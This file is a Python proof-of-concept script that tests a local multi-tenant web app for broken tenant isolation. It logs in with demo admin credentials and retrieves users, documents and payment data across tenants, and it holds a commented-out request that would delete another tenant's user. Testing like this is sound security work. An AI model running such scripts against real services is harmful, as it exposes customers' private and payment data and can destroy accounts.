#!/usr/bin/env python3

import requests
import json

BASE_URL = "http://localhost:5000"

def exploit_admin_access():
    print("[*] Testing admin privilege escalation...")
    
    # Login as admin
    login_data = {
        "email": "demo@tenantguard.com",
        "password": "demo123"
    }
    
    response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    if response.status_code != 200:
        print("[-] Admin login failed")
        return False
    
    token = response.json()["token"]
    headers = {"Authorization": f"Bearer {token}"}
    
    # Access all users across all tenants
    print("[*] Accessing cross-tenant user data...")
    
    users_response = requests.get(f"{BASE_URL}/api/admin/users", headers=headers)
    
    if users_response.status_code == 200:
        users = users_response.json()
        print(f"[+] Retrieved {len(users)} users from all tenants!")
        
        # Show users from different tenants
        tenants = {}
        for user in users:
            tenant_name = user.get('tenantId', {}).get('name', 'Unknown')
            if tenant_name not in tenants:
                tenants[tenant_name] = []
            tenants[tenant_name].append(user.get('email'))
        
        for tenant, emails in tenants.items():
            print(f"[+] Tenant '{tenant}': {len(emails)} users")
    
    # Access all documents system-wide
    print("[*] Accessing cross-tenant documents...")
    
    docs_response = requests.get(f"{BASE_URL}/api/admin/documents", headers=headers)
    
    if docs_response.status_code == 200:
        documents = docs_response.json()
        print(f"[+] Retrieved {len(documents)} documents from all tenants!")
    
    # Access payment data across all tenants
    print("[*] Accessing cross-tenant payment data...")
    
    payments_response = requests.get(f"{BASE_URL}/api/payment/admin/all-payments", 
                                   headers=headers)
    
    if payments_response.status_code == 200:
        payments = payments_response.json()
        print("[+] Retrieved payment data from all tenants!")
        print(f"[+] Total revenue: ${payments.get('totalRevenue', 0)}")
    
    # Try to delete users from other tenants
    print("[*] Testing cross-tenant user deletion...")
    
    if users_response.status_code == 200:
        users = users_response.json()
        
        # Find a user from a different tenant
        for user in users:
            if user.get('email') != 'demo@tenantguard.com':
                user_id = user.get('_id')
                
                # Attempt deletion (be careful in real testing)
                print(f"[*] Would delete user: {user.get('email')} (ID: {user_id})")
                # Uncomment below line for actual deletion test
                # delete_response = requests.delete(f"{BASE_URL}/api/admin/users/{user_id}", headers=headers)
                break
    
    return True

if __name__ == "__main__":
    exploit_admin_access()